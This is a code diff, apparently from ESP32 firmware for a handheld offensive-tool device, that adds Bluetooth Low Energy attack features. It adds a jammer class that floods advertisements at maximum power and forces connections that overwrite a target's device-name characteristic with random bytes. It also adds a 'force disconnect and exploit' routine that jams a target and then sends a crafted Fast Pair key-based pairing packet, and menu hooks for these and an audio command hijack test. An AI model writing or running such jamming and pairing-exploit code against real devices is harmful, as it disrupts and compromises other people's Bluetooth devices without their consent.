@@ -17,6 +17,87 @@ extern bool returnToMenu;
 AudioCommandService audioCmd;
 FastPairCrypto crypto;
 
+class BLEJammer {
+private:
+    NimBLEAdvertising* pAdvertising;
+    bool isJamming;
+    
+public:
+    BLEJammer() : isJamming(false), pAdvertising(nullptr) {}
+    
+    void startAdvertisingJam() {
+        if(isJamming) return;
+        
+        NimBLEDevice::init("JAMMER");
+        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+        
+        pAdvertising = NimBLEDevice::getAdvertising();
+        
+        uint8_t jamData[31];
+        memset(jamData, 0xAA, 31);
+        
+        BLEAdvertisementData advertData;
+        advertData.setFlags(0x06);
+        advertData.setManufacturerData(jamData, 31);
+        
+        pAdvertising->setAdvertisementData(advertData);
+        pAdvertising->setMinInterval(0x0020);
+        pAdvertising->setMaxInterval(0x0040);
+        pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
+        
+        pAdvertising->start();
+        isJamming = true;
+    }
+    
+    void targetConnectionJam(NimBLEAddress target) {
+        if(!NimBLEDevice::getInitialized()) {
+            NimBLEDevice::init("CONN_JAM");
+        }
+        
+        NimBLEClient* pClient = NimBLEDevice::createClient();
+        
+        if(pClient->connect(target, false)) {
+            delay(100);
+            
+            uint8_t garbage[50];
+            esp_fill_random(garbage, 50);
+            
+            for(int i = 0; i < 5; i++) {
+                NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1800));
+                if(pService) {
+                    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x2A00));
+                    if(pChar) {
+                        pChar->writeValue(garbage, 50, false);
+                    }
+                }
+                delay(50);
+            }
+            
+            pClient->disconnect();
+        }
+        
+        NimBLEDevice::deleteClient(pClient);
+    }
+    
+    void stopJam() {
+        if(!isJamming) return;
+        
+        if(pAdvertising) {
+            pAdvertising->stop();
+        }
+        NimBLEDevice::deinit(true);
+        isJamming = false;
+    }
+    
+    bool isActive() { return isJamming; }
+    
+    ~BLEJammer() {
+        stopJam();
+    }
+};
+
+BLEJammer bleJammer;
+
 int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true) {
     int buttonCount = 0;
     if(strlen(btn1) > 0) buttonCount++;
@@ -326,6 +407,7 @@ bool whisperPairFullExploit(NimBLEAddress target) {
 
 String selectTargetFromScan(const char* title) {
     std::vector<Option> deviceOptions;
+    std::vector<NimBLEAdvertisedDevice> foundDevices;
     String selectedMAC = "";
     uint8_t selectedAddrType = BLE_ADDR_PUBLIC;
     
@@ -333,11 +415,21 @@ String selectTargetFromScan(const char* title) {
     drawMainBorderWithTitle(title);
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     
-    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
+    tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
     tft.setCursor(20, 60);
-    tft.print("Scanning... 30s");
+    tft.print("Scanning... 20s");
     tft.setCursor(20, 80);
     tft.print("Found: 0");
+    tft.setCursor(20, 100);
+    tft.print("Press ESC to cancel");
+    
+    uint32_t scanStartTime = millis();
+    uint32_t scanDuration = 20000;
+    bool scanCancelled = false;
+    
+    if(NimBLEDevice::getInitialized()) {
+        NimBLEDevice::deinit(true);
+    }
     
     BLEDevice::init("");
     BLEScan* pBLEScan = BLEDevice::getScan();
@@ -348,40 +440,85 @@ String selectTargetFromScan(const char* title) {
     
     pBLEScan->clearResults();
     pBLEScan->setActiveScan(true);
-    pBLEScan->setInterval(100);
-    pBLEScan->setWindow(99);
+    pBLEScan->setInterval(97);
+    pBLEScan->setWindow(37);
+    pBLEScan->setDuplicateFilter(false);
     
-    BLEScanResults foundDevices;
+    class ScanCallback : public NimBLEScanCallbacks {
+    private:
+        std::vector<NimBLEAdvertisedDevice>* devices;
+        TFT_eSPI* tft;
+        uint32_t* foundCount;
+        
+    public:
+        ScanCallback(std::vector<NimBLEAdvertisedDevice>* devs, TFT_eSPI* display, uint32_t* count) 
+            : devices(devs), tft(display), foundCount(count) {}
+        
+        void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
+            devices->push_back(*advertisedDevice);
+            (*foundCount)++;
+            
+            if((*foundCount) % 3 == 0) {
+                tft->fillRect(20, 80, 100, 20, bruceConfig.bgColor);
+                tft->setCursor(20, 80);
+                tft->print("Found: " + String(*foundCount));
+            }
+        }
+    };
     
-#ifdef NIMBLE_V2_PLUS
-    foundDevices = pBLEScan->getResults(30000, false);
-#else
-    foundDevices = pBLEScan->start(30, false);
-#endif
+    uint32_t foundCount = 0;
+    ScanCallback scanCallback(&foundDevices, &tft, &foundCount);
+    pBLEScan->setScanCallbacks(&scanCallback);
+    
+    pBLEScan->start(scanDuration / 1000, false);
+    
+    while(millis() - scanStartTime < scanDuration && !scanCancelled) {
+        uint32_t remaining = (scanStartTime + scanDuration - millis()) / 1000;
+        tft.fillRect(20, 60, 200, 20, bruceConfig.bgColor);
+        tft.setCursor(20, 60);
+        tft.print("Scanning... " + String(remaining) + "s");
+        
+        if(check(EscPress)) {
+            scanCancelled = true;
+            pBLEScan->stop();
+            break;
+        }
+        
+        delay(100);
+    }
     
     pBLEScan->clearResults();
     
-    int deviceCount = foundDevices.getCount();
+    if(scanCancelled) {
+        showAdaptiveMessage("Scan cancelled", "OK", "", "", TFT_YELLOW);
+        delay(1000);
+        return "";
+    }
     
-    tft.fillRect(20, 80, 200, 20, bruceConfig.bgColor);
+    tft.fillRect(20, 60, 200, 40, bruceConfig.bgColor);
+    tft.setCursor(20, 60);
+    tft.print("Scan complete!");
     tft.setCursor(20, 80);
-    tft.print("Found: " + String(deviceCount));
+    tft.print("Found: " + String(foundCount));
+    delay(1000);
     
-    if(deviceCount == 0) {
+    if(foundCount == 0) {
         showAdaptiveMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
         delay(1500);
         return "";
     }
     
-    for(int i = 0; i < deviceCount; i++) {
-        const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
-        if(!device) continue;
+    for(size_t i = 0; i < foundDevices.size(); i++) {
+        NimBLEAdvertisedDevice device = foundDevices[i];
         
-        String name = device->getName().c_str();
-        String address = device->getAddress().toString().c_str();
-        uint8_t addrType = device->getAddressType();
+        String name = device.getName();
+        String address = device.getAddress().toString();
+        uint8_t addrType = device.getAddressType();
+        int rssi = device.getRSSI();
         
-        if(name.isEmpty()) name = address;
+        if(name.isEmpty()) {
+            name = address;
+        }
         
         String displayText = name;
         if(displayText.length() > 20) {
@@ -402,7 +539,7 @@ String selectTargetFromScan(const char* title) {
             tft.print("MAC: " + address);
             
             tft.setCursor(20, 120);
-            tft.print("RSSI: " + String(device->getRSSI()) + " dBm");
+            tft.print("RSSI: " + String(rssi) + " dBm");
             
             tft.setCursor(20, 150);
             tft.print("Type: ");
@@ -474,6 +611,134 @@ void testFastPairVulnerability() {
     bool vulnerable = attemptKeyBasedPairing(target);
     
     delay(2000);
+}
+
+void disconnectAndExploit(NimBLEAddress target) {
+    showAdaptiveMessage("Starting jam to disconnect...", "", "", "", TFT_YELLOW, false);
+    
+    bleJammer.startAdvertisingJam();
+    delay(2000);
+    
+    bleJammer.stopJam();
+    delay(500);
+    
+    showAdaptiveMessage("Attempting connection...", "", "", "", TFT_WHITE, false);
+    
+    NimBLEClient* pClient = NimBLEDevice::createClient();
+    
+    if(pClient->connect(target, true)) {
+        showAdaptiveMessage("Connected! Running exploit...", "", "", "", TFT_WHITE, false);
+        
+        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+        if(pService) {
+            NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
+            if(pChar) {
+                uint8_t packet[16] = {0};
+                packet[0] = 0x00;
+                packet[1] = 0x11;
+                
+                uint8_t targetBytes[6];
+                std::string macStr = target.toString();
+                sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                       &targetBytes[5], &targetBytes[4], &targetBytes[3],
+                       &targetBytes[2], &targetBytes[1], &targetBytes[0]);
+                
+                memcpy(&packet[2], targetBytes, 6);
+                esp_fill_random(&packet[8], 8);
+                
+                if(pChar->writeValue(packet, 16, false)) {
+                    delay(100);
+                    bool vulnerable = pChar->canRead() || pChar->canNotify();
+                    pClient->disconnect();
+                    
+                    if(vulnerable) {
+                        showAdaptiveMessage("DEVICE VULNERABLE!", "OK", "", "", TFT_GREEN);
+                    } else {
+                        showAdaptiveMessage("No response", "Device may be patched", "OK", "", TFT_YELLOW);
+                    }
+                } else {
+                    showAdaptiveMessage("Failed to send packet", "OK", "", "", TFT_RED);
+                }
+            } else {
+                showAdaptiveMessage("KBP char not found", "OK", "", "", TFT_YELLOW);
+            }
+        } else {
+            showAdaptiveMessage("Fast Pair service not found", "OK", "", "", TFT_YELLOW);
+        }
+        
+        pClient->disconnect();
+    } else {
+        showAdaptiveMessage("Still connected elsewhere", "Try manual disconnect", "OK", "", TFT_RED);
+    }
+    
+    NimBLEDevice::deleteClient(pClient);
+}
+
+void bleJammerMenu() {
+    tft.fillScreen(bruceConfig.bgColor);
+    drawMainBorderWithTitle("BLE JAMMER");
+    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+    tft.setCursor(20, 60);
+    tft.print("1. Start Advertising Jam");
+    tft.setCursor(20, 90);
+    tft.print("2. Target Connection Jam");
+    tft.setCursor(20, 120);
+    tft.print("3. Stop Jam");
+    tft.setCursor(20, 160);
+    tft.print("SEL: Select  ESC: Back");
+    
+    int selection = 0;
+    bool redraw = true;
+    
+    while(true) {
+        if(check(EscPress)) return;
+        
+        if(redraw) {
+            tft.fillRect(20, 180, tftWidth - 40, 30, bruceConfig.bgColor);
+            tft.setCursor(20, 180);
+            if(selection == 0) tft.print(">> Start Advertising Jam");
+            else if(selection == 1) tft.print(">> Target Connection Jam");
+            else tft.print(">> Stop Jam");
+            redraw = false;
+        }
+        
+        if(check(PrevPress)) {
+            if(selection > 0) {
+                selection--;
+                redraw = true;
+            }
+        }
+        if(check(NextPress)) {
+            if(selection < 2) {
+                selection++;
+                redraw = true;
+            }
+        }
+        if(check(SelPress)) {
+            if(selection == 0) {
+                bleJammer.startAdvertisingJam();
+                showAdaptiveMessage("Advertising Jam Started", "OK", "", "", TFT_GREEN);
+            }
+            else if(selection == 1) {
+                String selectedInfo = selectTargetFromScan("SELECT TARGET");
+                if(!selectedInfo.isEmpty()) {
+                    int colonPos = selectedInfo.lastIndexOf(':');
+                    String selectedMAC = selectedInfo.substring(0, colonPos);
+                    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
+                    NimBLEAddress target(selectedMAC.c_str(), addrType);
+                    
+                    bleJammer.targetConnectionJam(target);
+                    showAdaptiveMessage("Connection Jam Attempted", "OK", "", "", TFT_YELLOW);
+                }
+            }
+            else {
+                bleJammer.stopJam();
+                showAdaptiveMessage("Jam Stopped", "OK", "", "", TFT_WHITE);
+            }
+            return;
+        }
+        delay(50);
+    }
 }
 
 void whisperPairMenu() {
@@ -555,8 +820,40 @@ void whisperPairMenu() {
         }
     }});
 
+    options.push_back({"[Force Disconnect & Test]", []() {
+        initBLEIfNeeded("Bruce-WP-JAM");
+        
+        String selectedInfo = selectTargetFromScan("SELECT TARGET");
+        if(selectedInfo.isEmpty()) return;
+        
+        int colonPos = selectedInfo.lastIndexOf(':');
+        if(colonPos == -1) {
+            showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
+            return;
+        }
+        
+        String selectedMAC = selectedInfo.substring(0, colonPos);
+        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
+        
+        NimBLEAddress target;
+        try {
+            target = NimBLEAddress(selectedMAC.c_str(), addrType);
+        } catch (...) {
+            showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
+            return;
+        }
+        
+        if(!requireSimpleConfirmation("Force disconnect and test?")) return;
+        
+        disconnectAndExploit(target);
+    }});
+
     options.push_back({"[Audio CMD Hijack]", []() {
         audioCommandHijackTest();
+    }});
+
+    options.push_back({"[BLE Jammer]", []() {
+        bleJammerMenu();
     }});
 
     options.push_back({"[Back]", []() { returnToMenu = true; }});
